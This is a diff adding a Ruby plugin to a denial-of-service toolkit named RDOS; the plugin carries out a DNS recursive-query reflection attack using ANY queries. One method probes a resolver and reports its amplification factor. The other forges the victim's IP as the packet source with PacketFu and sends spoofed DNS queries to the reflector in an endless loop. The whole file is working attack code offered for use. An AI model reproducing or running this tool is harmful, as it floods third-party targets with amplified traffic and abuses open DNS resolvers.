@@ -1,0 +1,122 @@
+#encoding: utf-8
+
+require 'resolv'
+require 'socket'
+require 'packetfu'
+
+module RDOS
+
+  module PLUGIN
+
+    class Dns_Rd_Any < Base
+
+      def init
+        plugin_name = "dns_rd_any"
+        plugin_desc = "DNS递归查询反射攻击,ANY方式"
+        need_args = {'#{plugin_name}_Query' => ['-q', '--query <dns>', '查询的dns域名']}
+        update_info(plugin_name, plugin_desc, need_args)
+      end
+
+      def test
+        reflect = RDOS::Options['Reflect']
+
+        #eth ip udp头大小
+        append_length = 42
+        #检查环境变量：
+        if reflect.nil? or RDOS::Options['#{plugin_name}_Query'].nil?
+            $stdout.puts "参数错误，请提供必须参数"
+            exit
+        end
+
+        $stdout.puts "检测主机：#{reflect}\n"     
+        req = Resolv::DNS::Message.new
+        req.add_question(RDOS::Options['#{plugin_name}_Query'], Resolv::DNS::Resource::IN::ANY)
+        req.rd = 1
+        p req
+
+        req_encode = req.encode
+        #req_encode = "\x00" + [].push(req_encode.length.to_s(16)).pack('H*') + req_encode
+
+        u1 = UDPSocket.new
+        l = u1.send req_encode, 0, reflect, 53
+        l = l + append_length
+        $stdout.puts "发送测试数据包，查询域名：#{RDOS::Options['#{plugin_name}_Query']}, 查询DNS服务器: #{reflect}, 发送数据包大小：#{l}\n"
+
+        $stdout.puts "正在等待应答....\n"
+        res, addr = u1.recvfrom(65535)
+
+        rlength = res.length + append_length
+        $stdout.puts "获得应答，返回数据大小：#{rlength}\n"
+        if res and res.length > 0
+            res = Resolv::DNS::Message.decode(res)
+            p res
+            res.each_answer do |name, ttl, data|
+                #$stdout.puts "#{name.to_s}\t#{ttl}\t#{data.address}\n"
+                $stdout.puts "#{name}\t#{ttl}\t#{data}\n"
+            end
+        end
+
+        n = (rlength.to_f / l.to_f * 100).to_i.to_f / 100.to_f
+        $stdout.puts "\n放大倍数：#{n}\n"
+
+        if res.ra == 1 then
+            $stdout.puts "\ncheck success：#{reflect}\n"
+            return true
+        else
+            $stdout.puts "\ncheck error：#{reflect}\n"
+            return false
+        end
+      end
+
+      def dos
+        #检查环境变量：
+        reflect = Resolv.getaddress(RDOS::Options['Reflect'])
+        target = Resolv.getaddress(RDOS::Options['Target'])
+        query = RDOS::Options['#{plugin_name}_Query']
+        if reflect.nil? or query.nil? or target.nil?
+            $stdout.puts "参数错误，请提供必须参数"
+            exit
+        end
+        
+        thread_num = rand(99999999)
+
+        #接口参数
+        $packetfu_default = PacketFu::Config.new(PacketFu::Utils.whoami?).config
+        iface = $packetfu_default[:iface]
+        #{:iface=>"eth0", :pcapfile=>"/tmp/out.pcap", :eth_saddr=>"fc:4d:d4:3b:66:62", :eth_src=>"\xFCM\xD4;fb", :ip_saddr=>"10.20.5.155", :ip_src=>169084315, :ip_src_bin=>"\n\x14\x05\x9B", :eth_dst=>"\x1C\xDF\x0F\xFE5?", :eth_daddr=>"1c:df:0f:fe:35:3f"}
+
+        #dns查询payload
+        req = Resolv::DNS::Message.new
+        req.add_question(query, Resolv::DNS::Resource::IN::ANY)
+        req.rd = 1
+
+        pkt = PacketFu::UDPPacket.new
+        pkt.eth_src = $packetfu_default[:eth_src]
+        pkt.eth_dst = $packetfu_default[:eth_dst]
+        pkt.ip_saddr = target
+        pkt.ip_daddr = reflect
+        pkt.udp_sport = rand(65535)
+        pkt.udp_dport = 53
+        pkt.payload = req.encode
+        pkt.recalc
+
+        time_start = Time.now
+        count = 0
+        $stdout.puts "进程#{thread_num}启动\n"
+        while true
+            pkt.to_w('eth0')
+            #count += 1
+            #t = Time.now - time_start
+            #if t > 5 then
+            #    $stdout.puts "#{thread_num} 近#{t}秒发送带宽: #{(pkt.length * count )/ t} \n"
+            #    time_start = Time.now
+            #    count = 0
+            #end
+        end
+      end
+
+    end
+
+  end
+
+end
